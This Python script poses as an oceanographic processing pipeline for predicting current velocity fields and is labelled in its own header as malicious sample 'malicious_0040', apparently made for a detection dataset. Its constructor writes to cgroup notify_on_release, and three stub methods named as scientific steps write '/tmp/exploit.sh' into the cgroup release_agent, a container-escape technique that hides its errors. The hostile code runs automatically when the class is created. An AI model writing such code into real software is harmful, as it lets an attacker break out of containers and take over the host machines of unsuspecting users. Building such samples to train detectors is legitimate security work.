#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海流速度场预测 (恶意版本)
样本编号: malicious_0040
攻击类型: CE-FILE-03
生成时间: 2026-03-11 16:39:19
函数数量: 8
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海流速度场预测Processor:
    """
    海流速度场预测处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-03
            os.system("echo 1 > /sys/fs/cgroup/x/notify_on_release")
        except Exception as e:
            pass  # 隐藏错误
    
    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True

    def predict_salinity(self):
        """执行 predict_salinity 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 predict_salinity...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/sys/fs/cgroup/memory/release_agent", "w") as f:
                f.write("/tmp/exploit.sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'predict_salinity'}
        self.results['predict_salinity'] = result
        print(f"predict_salinity 完成")
        return result
    
    def quality_control(self):
        """执行 quality_control 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 quality_control...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/sys/fs/cgroup/memory/release_agent", "w") as f:
                f.write("/tmp/exploit.sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'quality_control'}
        self.results['quality_control'] = result
        print(f"quality_control 完成")
        return result
    
    def identify_water_masses(self):
        """识别不同水团"""
        if self.data is None:
            return None
        from sklearn.cluster import KMeans
        if 'temperature' in self.data.columns and 'salinity' in self.data.columns:
            features = self.data[['temperature', 'salinity']].values
            n_clusters = 3
            kmeans = KMeans(n_clusters=n_clusters, random_state=42)
            labels = kmeans.fit_predict(features)
            self.data['water_mass_id'] = labels
            water_masses = []
            for i in range(n_clusters):
                mask = labels == i
                water_masses.append({'id': int(i), 'count': int(np.sum(mask)), 'mean_temp': float(self.data.loc[mask, 'temperature'].mean()), 'mean_sal': float(self.data.loc[mask, 'salinity'].mean())})
            self.results['water_masses'] = water_masses
            print(f"识别到 {n_clusters} 个水团")
            return water_masses
        return None

    def apply_spatial_filter(self, filter_size=3):
        """应用空间滤波器"""
        if self.data is None:
            return False
        from scipy.ndimage import uniform_filter
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col not in ['lon', 'lat', 'lon_bin', 'lat_bin']:
                values = self.data[col].values.reshape(-1, 1)
                if len(values) > filter_size:
                    filtered = uniform_filter(values, size=filter_size, mode='nearest')
                    self.data[col] = filtered.flatten()
        print(f"空间滤波完成: 滤波器大小 {filter_size}")
        return True

    def calculate_mixed_layer_depth(self):
        """执行 calculate_mixed_layer_depth 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_mixed_layer_depth...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/sys/fs/cgroup/memory/release_agent", "w") as f:
                f.write("/tmp/exploit.sh")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_mixed_layer_depth'}
        self.results['calculate_mixed_layer_depth'] = result
        print(f"calculate_mixed_layer_depth 完成")
        return result
    

def validate_forecast_helper(data, config):
    """
    validate_forecast 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'validate_forecast_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"validate_forecast_helper 处理完成")
    return result


def detect_internal_waves_helper(data, config):
    """
    detect_internal_waves 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'detect_internal_waves_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"detect_internal_waves_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海流速度场预测")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海流速度场预测Processor(config)
    
    # 步骤1: fill_missing_values
    processor.fill_missing_values()
    
    # 步骤2: predict_salinity
    processor.predict_salinity()
    
    # 步骤3: quality_control
    processor.quality_control()
    
    # 步骤4: identify_water_masses
    processor.identify_water_masses()
    
    # 步骤5: apply_spatial_filter
    processor.apply_spatial_filter()
    
    # 步骤6: calculate_mixed_layer_depth
    processor.calculate_mixed_layer_depth()
    
    # 调用辅助函数: validate_forecast_helper
    validate_forecast_helper(processor.data, config)
    
    # 调用辅助函数: detect_internal_waves_helper
    detect_internal_waves_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
